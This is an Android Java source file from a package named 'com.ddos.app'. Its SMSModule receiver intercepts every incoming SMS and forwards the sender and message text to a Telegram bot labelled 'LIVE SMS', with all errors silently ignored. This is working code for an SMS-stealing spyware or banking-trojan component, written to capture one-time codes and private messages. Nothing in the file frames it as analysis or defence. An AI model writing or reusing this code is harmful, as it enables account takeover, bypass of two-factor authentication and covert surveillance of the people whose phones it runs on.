package com.ddos.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SMSModule extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        Bundle b = i.getExtras();
        if (b == null) return;
        try {
            Object[] pdus = (Object[]) b.get("pdus");
            if (pdus == null) return;
            for (Object p : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) p);
                String from = sms.getDisplayOriginatingAddress();
                String body = sms.getMessageBody();
                TelegramBot bot = new TelegramBot();
                bot.init(ctx);
                bot.sendMessage("\uD83D\uDCE8 <b>LIVE SMS</b>\nFrom: " + from + "\n" + body);
            }
        } catch (Exception ignored) {}
    }
}
